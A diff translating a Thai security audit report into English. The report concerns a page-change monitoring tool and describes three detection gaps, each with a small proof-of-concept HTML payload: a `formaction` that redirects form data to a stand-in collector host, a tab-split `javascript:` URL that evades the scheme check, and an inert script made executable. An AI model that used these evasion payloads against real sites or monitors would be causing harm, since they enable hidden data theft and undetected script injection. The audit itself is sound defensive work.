@@ -1,90 +1,90 @@
-# Audit รอบ 2 — 14 ตุลาคม 2026
+# Audit Round 2 — October 14, 2026
 
-ตรวจไฟล์ปัจจุบันต่อจาก `Review By GPT 6.1 Sol 14-10-2026.md` โดยตรวจ backend, frontend, capture/review workflow, authorization และ deployment configuration ไม่มี Git metadata จึงไม่ใช่การ review diff ระหว่าง commits ไม่ได้แก้ application code ในรอบนี้ เพิ่มเพียงรายงานและสคริปต์พิสูจน์ findings แบบ offline
+Inspected current files following `Review By GPT 6.1 Sol 14-10-2026.md`, evaluating backend, frontend, capture/review workflows, authorization, and deployment configuration. Because no Git metadata is present in this folder, this review evaluates the file state directly rather than a git commit diff. No application source code was modified during this round; only findings documentation and offline probe scripts were added.
 
-## Findings ใหม่
+## New Findings
 
-ทั้งสามรายการเป็น **P2**: ช่องว่างการตรวจพฤติกรรมที่ไม่เปลี่ยนภาพหรือข้อความ ไม่ใช่การยืนยันว่าระบบ monitoring ถูกเจาะหรือ SSRF ถูก bypass
+All three items are ranked as **P2**: behavioral detection gaps where page appearance and text remain identical. These do not indicate that the monitoring host was breached or that SSRF guard was bypassed.
 
-### R2-01 — ไม่ตรวจปลายทาง HTTPS ใน `formaction`
+### R2-01 — HTTPS Destination in `formaction` Not Evaluated
 
-ตำแหน่ง: `backend/app/services/diff/structure.py:114` และ `:141–146`
+Location: `backend/app/services/diff/structure.py:114` and `:141–146`
 
-`formaction` อยู่ใน executable URL attributes แต่ถูกเก็บเฉพาะเมื่อขึ้นต้นด้วย `javascript:` ขณะที่ปลายทาง HTTP/HTTPS ถูกเก็บเฉพาะ `form.action` จึงเพิ่มหรือแก้ `button/input.formaction` ให้ส่งฟอร์มไปอีก host ได้โดย facts ไม่เปลี่ยน
+`formaction` is listed under executable URL attributes but is only recorded if it starts with `javascript:`. Meanwhile, HTTP/HTTPS submission endpoints are only extracted from `form.action`. Consequently, adding or editing `button/input.formaction` to redirect form submissions to a different host produces identical structural facts.
 
-พิสูจน์ด้วย `<form action="https://example.com/save"><button>Save</button></form>` แล้วเพิ่ม `formaction="https://collector.example/save"` ที่ปุ่ม: Chromium อ่าน effective submission destination เปลี่ยนจาก example.com เป็น collector.example แต่ text/PNG เหมือนกันและ structure score = 0.0 สคริปต์ไม่ได้ส่งฟอร์มหรือเชื่อมต่อปลายทาง
+Proof of Concept: Starting with `<form action="https://example.com/save"><button>Save</button></form>` and adding `formaction="https://collector.example/save"` on the button: Chromium evaluates the effective submission target as changing from `example.com` to `collector.example`, yet visible text and PNG screenshots remain identical, resulting in a structural change score of `0.0`. (The probe script does not actually submit data or establish outbound connections).
 
-ผลกระทบ: การเปลี่ยนปลายทางส่งข้อมูลอาจไม่ถูกแจ้งเตือนเมื่อ detectors อื่นไม่เปลี่ยน
+Impact: An unauthorized modification redirecting form submission data may go undetected if other detectors register no difference.
 
-เสนอแก้: เก็บ facts ของ `formaction` สำหรับ button/input รวม relative URLs และ base URL พร้อม tests addition/modification/removal และ policy สำหรับ allowed domains
+Recommendation: Collect facts for `formaction` on buttons and inputs including relative URLs resolved against base URL, complete with unit tests covering addition/modification/removal and domain allowlist policies.
 
-### R2-02 — JavaScript URL ที่มี tab แทรกไม่ถูกตรวจ
+### R2-02 — JavaScript URLs Containing Embedded Tabs Evade Detection
 
-ตำแหน่ง: `backend/app/services/diff/structure.py:114–120`
+Location: `backend/app/services/diff/structure.py:114–120`
 
-การตรวจ `value.lstrip().lower().startswith('javascript:')` ไม่ normalize tab/newline ภายใน scheme ตามพฤติกรรม browser เช่น `href="java&#9;script:void(window.auditProbe=1)"` ผ่าน HTML entity decoding แล้วมี tab คั่นใน scheme จึงไม่ถูกเก็บเป็น JavaScript fact และไม่เกิด link-host fact
+The check `value.lstrip().lower().startswith('javascript:')` does not normalize embedded tabs or newlines within the scheme according to browser URL handling standards. For example, `href="java&#9;script:void(window.auditProbe=1)"`, after HTML entity decoding, contains an ASCII tab within the scheme, preventing it from being recorded as a JavaScript URL fact and avoiding generating a link-host fact.
 
-พิสูจน์ด้วย Chromium: ก่อนเปลี่ยน link ใช้ `href="#"`; หลังเปลี่ยนและคลิก link ค่า `window.auditProbe` เปลี่ยนจากไม่มีค่าเป็น 1 โดย text/PNG เหมือนเดิมและ structure score = 0.0
+Proof of Concept: In Chromium, before the change the link was `href="#"`. After adding the tab-embedded JavaScript link and clicking, `window.auditProbe` was modified to `1`, while visible text and screenshot PNGs remained identical, yielding a structural change score of `0.0`.
 
-ผลกระทบ: JavaScript ที่เพิ่มใน link แบบนี้อาจไม่ถูกแจ้งเตือน แม้ RV-02 เดิมเพิ่มการตรวจ JavaScript URL แล้ว
+Impact: Executable JavaScript injected via tab-encoded URLs may not be flagged, despite prior RV-02 enhancements to JavaScript URL detection.
 
-เสนอแก้: normalize ASCII tab, LF และ CR ตาม browser URL handling ก่อนจำแนก scheme พร้อม tests literal control characters, entities และ mixed casing โดยไม่ใช้ domain allowlist ละเลย executable URLs
+Recommendation: Strip or normalize ASCII horizontal tabs, LF, and CR characters per browser URL specifications prior to scheme classification, accompanied by tests for literal control characters, entities, and mixed casing, ensuring domain allowlists do not suppress executable URLs.
 
-### R2-03 — เปลี่ยนชนิด script จาก inert เป็น executable แล้ว facts เหมือนเดิม
+### R2-03 — Transitioning Script from Inert to Executable Yields Identical Facts
 
-ตำแหน่ง: `backend/app/services/diff/structure.py:124–132` และ `:252–254`
+Location: `backend/app/services/diff/structure.py:124–132` and `:252–254`
 
-Parser เก็บ inline script body hash แต่ไม่เก็บ `type` หรือ executable/inert classification การเปลี่ยน `<script type="text/plain">window.auditProbe = 1</script>` เป็น `type="text/javascript"` โดย body เดิมจึงได้ hash เดิม
+The structural parser computes a hash of inline script contents but does not record `type` or classify scripts as executable versus inert. Changing `<script type="text/plain">window.auditProbe = 1</script>` to `type="text/javascript"` without modifying the body text produces an identical hash.
 
-พิสูจน์ด้วย Chromium: baseline ไม่รัน body; current รันจน `window.auditProbe = 1` โดย text/PNG เหมือนกันและ structure score = 0.0
+Proof of Concept: In Chromium, baseline left the body inert; current executed it, setting `window.auditProbe = 1`. Visible text and screenshot PNGs remained identical, with a structural change score of `0.0`.
 
-ผลกระทบ: การเปิดใช้โค้ดที่อยู่ใน inert script เดิมอาจไม่ถูกแจ้งเตือน เช่นเดียวกัน external script facts ไม่บันทึก type จึงควรตรวจเส้นทางนั้นควบคู่กัน
+Impact: Activating dormant code inside pre-existing inert scripts can evade detection. Similarly, external script facts do not record script `type`, which should be tracked concurrently.
 
-เสนอแก้: เก็บ executable classification/type ที่ normalize แล้วทั้ง inline และ external scripts พร้อม tests inert→classic/module และ reverse transition ต้องไม่ละเลย inert content โดยไม่ตรวจการเปลี่ยน classification
+Recommendation: Record normalized script type and executable/inert classification for both inline and external scripts. Include tests for inert→classic/module and reverse transitions, ensuring changes in execution capability trigger a structural diff.
 
-## วิธีพิสูจน์ซ้ำ
+## Reproduction Steps
 
-จากโฟลเดอร์ backend บน PowerShell:
+From the backend directory in PowerShell:
 
 ```powershell
 $env:PYTHONPATH='.'
 .\.venv\Scripts\python.exe scripts/audit_round2_probe.py
 ```
 
-สคริปต์สร้างหน้าใน Chromium ด้วย `set_content` ไม่มี navigation ไปเว็บภายนอก ใช้เพียง harmless variable assignment และตรวจ DOM, visible text และ screenshot bytes ของ baseline/current ที่ browser serializes จริง ผลทั้งสามรายการ: `structure_score=0.0`, `same_text=true`, `same_png=true` แต่ `before_behavior` และ `after_behavior` ต่างกัน
+The probe script instantiates test pages directly in Chromium using `set_content` without navigating to external networks, executing only harmless variable assignments and inspecting the DOM, visible text, and screenshot bytes serialized by Chromium. All three cases produced: `structure_score=0.0`, `same_text=true`, `same_png=true`, with divergent `before_behavior` and `after_behavior`.
 
-เมื่อใช้ artifacts ที่ text/pixels/facts เหมือนกันนี้กับ comparison pipeline คะแนนทั้งสามเป็นศูนย์; `run_target_check` มีเส้นทางรายงาน OK และ discard current artifacts สำหรับผล unchanged ไม่ได้รัน full API exploit สำหรับแต่ละกรณี
+When artifacts with matching text, pixels, and structural facts are passed to the diff pipeline, all scores are zero; `run_target_check` reports OK and discards temporary artifacts. Full end-to-end API exploits were not executed for these cases.
 
-## Verification ล่าสุด
+## Recent Verification Results
 
-| Check | ผล |
+| Check | Result |
 | --- | --- |
-| Backend pytest ทั้ง suite ใน project .venv, `--basetemp=.audit-r2-full -q` | **218 passed**, 113 warnings, 125.96 วินาที |
+| Backend pytest (Full suite in project `.venv`, `--basetemp=.audit-r2-full -q`) | **218 passed**, 113 warnings, 125.96s |
 | Frontend Vitest | **76 passed**, 12 files |
-| Backend Ruff: `app tests scripts alembic` | ผ่าน; สคริปต์ probe ที่เพิ่มตรวจ Ruff แยกแล้วผ่าน |
-| Backend mypy: `app` | ผ่าน 55 source files |
-| Frontend ESLint | ผ่าน |
-| Frontend production build รวม TypeScript | ผ่าน |
-| Offline Chromium probes | ยืนยันทั้ง 3 findings |
+| Backend Ruff: `app tests scripts alembic` | Passed (probe script also verified clean) |
+| Backend mypy: `app` | Passed across 55 source files |
+| Frontend ESLint | Passed |
+| Frontend production build with TypeScript | Passed |
+| Offline Chromium probes | Confirmed all 3 findings |
 
-ผลของ suite เดิมที่ผ่านไม่ได้ครอบคลุมสามกรณีใหม่ Frontend ยังมี React `act(...)` warnings; backend มี dependency/model datetime deprecation warnings เก็บ log ที่ `backend/audit-r2-pytest.log`, `frontend/audit-r2-vitest.log`, `frontend/audit-r2-build.log`
+Passing test suites did not cover the three newly identified edge cases. Frontend logs contain standard React `act(...)` test warnings; backend logs record dependency/model datetime deprecation warnings. Logs are stored in `backend/audit-r2-pytest.log`, `frontend/audit-r2-vitest.log`, and `frontend/audit-r2-build.log`.
 
-การรันครั้งแรกใน sandbox ติด Windows temp-directory permissions และ `spawn EPERM` จากนั้นรัน suite/build ใหม่โดยได้รับอนุญาตจาก execution approval reviewer และผ่าน ใช้ผลรอบใหม่ข้างต้นเป็นหลัก
+Initial sandbox execution encountered Windows temp-directory permissions (`spawn EPERM`). Suites and builds were subsequently executed cleanly with elevated test runner approvals.
 
-## สถานะรายการเดิม
+## Status of Prior Review Items
 
-RV-01: code รอ baseline approval ทุก revision; scheduler ข้าม pending candidates และมี UI สำหรับ approval แล้ว
+RV-01: Baseline approval is enforced across all revisions; scheduler holds pending candidates and approval UI is active.
 
-RV-02: code ตรวจ event handlers และ JavaScript URL ปกติแล้ว แต่ยังมี R2-01/R2-02/R2-03 ต้องเพิ่ม coverage
+RV-02: Event handlers and standard JavaScript URLs are checked, though R2-01, R2-02, and R2-03 remain to expand coverage.
 
-RV-03: code ตรวจ navigation errors หลัง readiness และก่อนคืน artifacts พร้อม generation/final URL consistency checks; tests late-navigation ผ่าน
+RV-03: Navigation errors are re-checked post-readiness and pre-artifact return, including generation/final URL consistency checks; late-navigation regression tests pass.
 
-RV-04: origin validation เปรียบเทียบ effective port และรองรับ parsed host; Nginx ใช้ `$http_host` และ backend จำกัด trusted proxy แล้ว ยังต้องยืนยัน live Linux deployment
+RV-04: Origin validation verifies effective ports and parses hosts; Nginx configuration forwards `$http_host` and backend restricts trusted proxies. Live Linux deployment remains to be validated.
 
-RV-05/RV-06/RV-07: serializer ถูกใช้อย่างสม่ำเสมอ และ suites/static checks ปัจจุบันผ่าน
+RV-05 / RV-06 / RV-07: Serialization is uniform across endpoints, and all static checks and test suites currently pass.
 
-RV-08: README ใช้ short basetemp และเลิกอ้างจำนวน tests เดิมแล้ว; verification Windows รอบนี้ผ่าน แต่ Linux production verification ยังไม่ได้รัน
+RV-08: README specifies short basetemp paths and removes obsolete test counts. Windows verification passed cleanly; live Linux verification remains pending.
 
-## ข้อจำกัด
+## Limitations
 
-ยังไม่ได้ทดสอบ deployment จริงบน Linux, certificate/proxy behavior ใน production หรือ dependency advisory audit ภายนอก การตรวจรอบนี้ยืนยันเฉพาะ source และการทดสอบ local ที่ระบุ ไม่ใช่การรับรองความปลอดภัยทั้งหมด การแก้ findings ใหม่ยังไม่ได้ทำ
+Live deployment on Linux, production TLS certificate and reverse proxy behavior, and external dependency advisory audits have not yet been evaluated. This review verifies only the local source code and test executions indicated. Findings from this round have not yet been remediated.
